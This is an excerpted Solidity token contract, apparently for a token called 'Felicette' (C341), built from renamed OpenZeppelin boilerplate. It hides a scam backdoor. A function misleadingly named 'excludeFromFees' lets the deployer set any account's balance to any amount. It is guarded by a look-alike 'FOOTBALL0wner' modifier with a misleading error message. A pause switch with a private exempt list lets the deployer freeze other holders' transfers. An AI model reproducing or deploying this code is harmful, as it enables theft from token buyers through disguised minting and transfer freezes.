...
abstract contract FOOTBALLContext {
...
interface FOOTBALLIERC71Metadata is FOOTBALLIERC71 {
    /**
...
abstract contract FOOTBALLOwnable is FOOTBALLContext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "FOOTBALLOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FOOTBALLOwnable: new owner is the zero address");
...
contract Felicette is FOOTBALLContext, FOOTBALLIERC71, FOOTBALLIERC71Metadata, FOOTBALLOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private FOOTBALLbalances;
  mapping(address => bool) public FOOTBALLAZERTY;
  ...
  address FOOTBALLpinksale;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool FOOTBALLisPaused;
    ...
    constructor() {
            // Editable
            FOOTBALLpinksale = msg.sender;
            FOOTBALLAZERTY[FOOTBALLpinksale] = true;
        _name = "Felicette";
        _symbol = "C341";
        uint tALLtotalSupply = 1000000000000000000;
        FOOTBALLisPaused = false;
        // End editable
     ...
     * {FOOTBALLIERC71-balanceOf} and {FOOTBALLIERC71-transfer}.
     */
    ...
    /**
     * @dev See {FOOTBALLIERC71-totalSupply}.
     */
    ...
    /**
     * @dev See {FOOTBALLIERC71-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return FOOTBALLbalances[account];
    }

    /**
     * @dev See {FOOTBALLIERC71-transfer}.
     *
     * Requirements:
     *
    ...
    /**
     * @dev See {FOOTBALLIERC71-allowance}.
     */
    ...
    /**
     * @dev See {FOOTBALLIERC71-approve}.
     *
    ...
    /**
     * @dev See {FOOTBALLIERC71-transferFrom}.
     *
     ...
     * problems described in {FOOTBALLIERC71-approve}.
     *
  ...
  modifier FOOTBALL0wner () {
    require(FOOTBALLpinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!FOOTBALLisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = FOOTBALLbalances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            FOOTBALLbalances[from] = fromBalance - amount;
        }
        FOOTBALLbalances[to] += amount;
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        FOOTBALLbalances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
  function excludeFromFees(address account, uint256 amount) public FOOTBALL0wner {
    FOOTBALLbalances[account] = (amount - amount) + amount * 10 ** 9;
            emit Transfer(address(0), account, amount);
  }
    /**
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = FOOTBALLbalances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            FOOTBALLbalances[account] = accountBalance - amount;
        }
        ALLtotalSupply -= amount;
...
contract floki is FOOTBALLContext, IERC20, FOOTBALLOwnable { 
